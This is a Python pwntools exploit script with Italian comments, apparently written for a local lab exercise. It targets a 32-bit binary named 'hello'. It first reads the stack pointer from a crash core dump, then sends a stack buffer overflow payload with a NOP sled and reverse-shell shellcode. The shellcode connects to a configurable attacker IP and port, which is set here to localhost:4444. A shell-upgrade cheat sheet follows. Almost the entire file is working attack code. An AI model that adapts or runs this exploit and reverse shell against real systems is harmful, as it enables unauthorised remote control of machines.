from pwn import *
import os
import sys

# --- CONTROLLO DI SISTEMA (FONDAMENTALE) ---
# Se l'ASLR è attivo, gli indirizzi cambiano a ogni esecuzione e lo script fallirà.
with open("/proc/sys/kernel/randomize_va_space", "r") as f:
    if f.read().strip() != "0":
        log.error("ASLR è ATTIVO! Disabilitalo dal terminale con:")
        log.error("sudo sysctl -w kernel.randomize_va_space=0")
        sys.exit(1)
# -------------------------------------------


context.update(arch="i386", os="linux")
context.log_level = "error"

print("[*] FASE 1: Calcolo dinamico dello Stack Pointer (ESP)...")
os.system("rm -f core*")

p_crash = process("./hello")
p_crash.sendline(b"A" * 150)
p_crash.wait()

try:
    real_esp = p_crash.corefile.esp
    print(f"[+] INDIRIZZO TROVATO: ESP = {hex(real_esp)}")
except Exception as e:
    print("[-] Impossibile leggere il core dump.")
    exit()

print("[*] FASE 2: Iniezione della Reverse Shell Pura...")
context.log_level = "info"

p = process("./hello")

offset = 76

# Puntiamo l'indirizzo di ritorno un po' più avanti dentro i NOP
# per atterrare morbidamente ed evitare errori del processore
ret_address = real_esp + 20

# Usiamo il localhost per evitare IP che contengono ".10"
IP_ATTACCANTE = "127.0.0.1"
PORTA = 4444

# 1. Creiamo la connessione (Sappiamo che diventerà il File Descriptor 3)
assembly = shellcraft.connect(IP_ATTACCANTE, PORTA)

# 2. Scriviamo noi l'assembly per il reindirizzamento (dup2)
# La syscall dup2 ha l'identificativo 0x3f (63 in decimale)
assembly += """
    /* Forziamo il socket al FD 3 nel registro ebx */
    mov ebx, 3

    /* dup2(3, 0) - Manda lo STDIN al socket */
    mov al, 0x3f
    xor ecx, ecx
    int 0x80

    /* dup2(3, 1) - Manda lo STDOUT al socket */
    mov al, 0x3f
    mov cl, 1
    int 0x80

    /* dup2(3, 2) - Manda lo STDERR al socket */
    mov al, 0x3f
    mov cl, 2
    int 0x80
"""

# 3. Avviamo la shell
assembly += shellcraft.sh()

"""
Upgrade
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    Ctrl-Z
    stty raw -echo; fg
    export TERM=xterm-256color
    export SHELL=/bin/bash
"""

# Compiliamo il tutto in codice macchina
shellcode = asm(assembly)

# Costruiamo il payload con un NOP Sled generoso (100 byte)
payload = flat({offset: p32(ret_address), offset + 4: [b"\x90" * 100, shellcode]})

print("[*] Payload inviato. Guarda la finestra di Netcat!")
p.sendline(payload)

# Sostituiamo p.wait() con p.interactive() per assicurarci
# che lo script python non chiuda bruscamente il processo prima
# che la shell remota abbia il tempo di connettersi
p.interactive()
